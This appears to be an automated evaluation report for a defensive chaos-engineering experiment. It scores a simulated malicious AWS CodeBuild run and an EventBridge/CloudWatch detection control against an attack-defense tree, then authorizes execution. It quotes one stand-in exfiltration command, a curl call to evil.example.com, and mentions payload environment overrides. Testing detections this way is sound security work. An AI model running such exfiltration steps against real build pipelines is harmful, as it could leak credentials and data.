# PRE-EXECUTION QUALITY EVALUATION REPORT

## Experiment Information
- **SCE Node**: 1.8 SCE Experiment
- **Probe Type**: Detective
- **Attack Nodes**: 1.7 Start Malicious Build
- **Evaluation Date**: 2024-01-15

## Factor 1: ACTION ↔ Attack Correspondence
**Score**: 100
**Justification**: The attack implementation fully corresponds to ADT node 1.7 "Start Malicious Build". The ADT specifies:
- **Command**: `aws codebuild start-build` → The implementation uses `codebuild_client.start_build()` which is the SDK equivalent.
- **Dependencies**: "Malicious project exists" → The steady state phase creates the malicious project via CloudFormation before the attack executes.
- **Result**: "Credential exposure attempt" → The buildspec includes commands simulating data exfiltration (`curl http://evil.example.com/exfil`), and environment variables override includes `EXFIL_TARGET` and `MALICIOUS_PAYLOAD`.
- **TTP**: T1098.001 Account Manipulation → The build is designed to simulate credential exposure/manipulation through malicious build execution.

The implementation quality is high: it verifies the project exists before starting, includes suspicious environment variable overrides to make the attack realistic, uses a malicious buildspec override, captures the build ID for later verification and cleanup, and includes appropriate wait times for event propagation.

---

## Factor 2: Defense ↔ Defense Correspondence
**Score**: 100
**Justification**: The detective control in the implementation corresponds to ADT node 1.9 "Runtime Container Monitoring" and the detective probe described in node 1.8: "Will runtime monitoring detect extraction?"

The ADT specifies:
- **Node 1.9 Strategy**: "Container runtime analysis" with "Behavioral anomaly detection"
- **Node 1.8 Detective Probe**: "Will runtime monitoring detect extraction?"

The implementation deploys:
1. An EventBridge rule that captures CodeBuild Build State Change events for the specific project
2. CloudWatch Logs as the detection target
3. Verification through both CloudWatch Logs and CloudTrail for StartBuild events

The detective control is implemented with high quality:
- CloudFormation-based deployment ensures reproducibility and clean rollback
- EventBridge rule uses proper event pattern matching for the specific project
- Log group resource policy correctly grants EventBridge permissions
- Multi-source verification (EventBridge logs + CloudTrail) provides defense-in-depth detection
- Retry logic (8 attempts with 15-second delays) accounts for eventual consistency

While the implementation focuses on build state change events rather than deep container runtime analysis, it accurately represents the detective probe question from node 1.8 and aligns with the monitoring strategy described in node 1.9.

---

## Factor 3: PROBE ↔ Defensive Intent Correspondence
**Score**: 100
**Justification**: The probe's defensive intent is clearly stated in the ADT node 1.8: "Will runtime monitoring detect extraction?" The hypothesis verification function (`hypothesis_verification`) directly tests whether the detective control detected the malicious build start. 

The probe:
1. Verifies the EventBridge rule is enabled and active
2. Queries CloudWatch Logs for build state change events matching the malicious project
3. Falls back to CloudTrail verification for StartBuild API calls
4. Returns a boolean indicating whether detection occurred

This directly answers the detective probe question from the ADT. The experiment's steady-state hypothesis is "Malicious build start is detected by EventBridge rule and logged to CloudWatch Logs" — which is precisely the defensive intent of verifying that detective controls can identify when a malicious build is initiated.

---

## FINAL SCORE CALCULATION

**Q_pre = 0.40 × 100 + 0.30 × 100 + 0.30 × 100**
Q_pre = 100.00

**Threshold**: 80
**Result**: Q_pre >= 80

## DECISION

**AUTHORIZE EXECUTION**

---

## Recommendations

The experiment is well-designed and ready for execution. Minor suggestions for future improvement:
1. Consider adding GuardDuty findings verification as an additional detection source
2. The CloudTrail fallback is excellent but could include more granular filtering on the specific build ID
3. Consider reducing the overall experiment timeout by optimizing wait times if EventBridge propagation is consistently faster than 30 seconds in practice